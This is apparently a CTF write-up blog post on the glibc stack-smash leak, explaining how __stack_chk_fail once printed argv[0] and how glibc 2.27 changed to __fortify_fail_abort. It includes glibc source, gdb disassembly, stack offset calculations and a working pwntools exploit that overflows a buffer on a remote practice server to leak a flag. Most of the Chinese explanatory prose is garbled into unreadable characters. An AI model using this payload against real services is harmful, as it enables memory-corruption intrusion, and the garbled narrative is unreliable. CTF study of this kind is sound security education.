---
layout: post
title: "Stack Smashing Protector (SSP):__fortify_fail ->__fortify_fail_abort "
date: 2018-09-3
excerpt: "A ton of text to test readability with image feature."
tags: [pwn, ctfwiki,SSP,stack,CTF]
feature: https://i.ytimg.com/vi/uSC3guWOvpk/maxresdefault.jpg
comments: true
---

# Stack Smashing Protector (SSP):__fortify_fail ->__fortify_fail_abort 

ctfwiki�ϵ�һ������32C3 CTF smashes
https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-smash

������ƺ�����˼��ͨ��canary�����ı�����leak��������Ҫ����Ϣ��

������ʱ��������º�����
```
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}



void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```
ֱ�ӻ����������Ϣ��

�����ԭ���Ͳ������Կ�ctfwiki����ֱ����32C3 CTF smashes��WP

Ȼ���Ҹ��ֵ�ʱ�������Լ����������ֻ�����
![Alt text](http://thyrsi.com/t6/366/1536070637x-1566657657.png)


�������Ϸ��ֺ�libc�йأ�����

�õ�libc-2.27.so
![Alt text](http://thyrsi.com/t6/366/1536070669x-1566657657.png)

ԭ�����ҵ�__stack_chk_fail�������ģ�
```
gdb-peda$ disassemble  __stack_chk_fail
Dump of assembler code for function __stack_chk_fail:
   0x00007ffff7eec450 <+0>:	lea    rsi,[rip+0x78be8]        # 0x7ffff7f6503f
   0x00007ffff7eec457 <+7>:	sub    rsp,0x8
   0x00007ffff7eec45b <+11>:	xor    edi,edi
   0x00007ffff7eec45d <+13>:	call   0x7ffff7eec470 <__GI___fortify_fail_abort>
```
��û��ʹ��__fortify_fail������ʹ����fortify_fail_abort����ֹargv [0]��й¶��



fortify_fail_abort��������
```
__fortify_fail_abort (_Bool need_backtrace, const char *msg)
{
  /* The loop is added only to keep gcc happy.  Don't pass down
     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]
     may point to the corrupted stack.  */
  while (1)
    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,
                    "*** %s ***: %s terminated\n",
                    msg,
                    (need_backtrace && __libc_argv[0] != NULL
                     ? __libc_argv[0] : "<unknown>"));
}
//https://code.woboq.org/userspace/glibc/debug/fortify_fail.c.html#40
```
�ɼ���wihileѭ���``__libc_message ``�ĵ�һ��������``2``�����
``need_backtrace ? (do_abort | do_backtrace) : do_abort``

����``do_abort``��``do_backtrace``�ֱ���1��2����������
```
enum __libc_message_action
{
  do_message        = 0,                /* Print message.  */
  do_abort        = 1 << 0,        /* Abort.  */ 
  do_backtrace        = 1 << 1        /* Backtrace.  */
};
```

����ȡ����Ĭ�ϻ���->������Ϣ��ʾargv [0]�����ӡ�




����centos����������centos��libc�Ƚϡ�������

![Alt text](http://thyrsi.com/t6/366/1536070693x-1566657657.png)

ȷʵҲ�ܹ�leak��������������

![Alt text](http://thyrsi.com/t6/366/1536070722x-1566657657.png)

����centosû��pwntoolsҲ����װ

ֱ����Զ�����Ժ���

����buf��argv[0]��ƫ�ƣ�ֱ��rȻ�������ABCȻ��ڶ�����������ctrl+C�ն˿���ʱ��ջ��

![Alt text](http://thyrsi.com/t6/366/1536070741x-1566657657.png)

```
buf��0x7fffffffdf60
argv[0]:0x7fffffffe0a8 --> 0x7fffffffe178 --> 0x7fffffffe463 ("/root/Desktop/wiki/smashes")

hex(0x7fffffffe178 - 0x7fffffffdf60) = 0x218L
```

��ctf�����������

Ȼ��find CTF �ҵ�flag_addr

�õ�exp���£�

```
from pwn import *

context.log_level = 'debug'

io  = remote('pwn.jarvisoj.com', 9877)

flag_addr = 0x400d21


pattern = 'A'*0x218

payload = pattern + p64(flag_addr)


io.sendlineafter('name?',payload)

io.sendlineafter('flag:','')
io.interactive()
```

û�ɡ�

Ȼ�����ﻹ��һ����

������������64λ�ĳ���Ҫ��p64������p32����32x��ɵ�ˡ�

����һ������

![Alt text](http://thyrsi.com/t6/366/1536070765x-1566657657.png)


Ȼ���õ�Ӧ����``0x400d20``��Ȼ����һ����ĸ������

���Ը����������ط��Ϳ����ˡ�

��Ϊ������

���û�������``LIBC_FATAL_STDERR_=1``����ʵ�ֽ���׼������Ϣͨ���ܵ������Զ��shell��

�Ŀ�Ȼ����û�С�
�����������˵��
https://blog.csdn.net/happyorange2014/article/details/50459201

����




�ο���

1.https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.12_stack_chk_fail.html
2.https://qiita.com/sei0o/items/55db337b0829367a2052
3.http://site.pi3.com.pl/papers/ASSP.pdf


�����������ӿ���i��˼��˼���������˽�һ��SSP����������˲��ٺ�SSP��ص�һЩ������













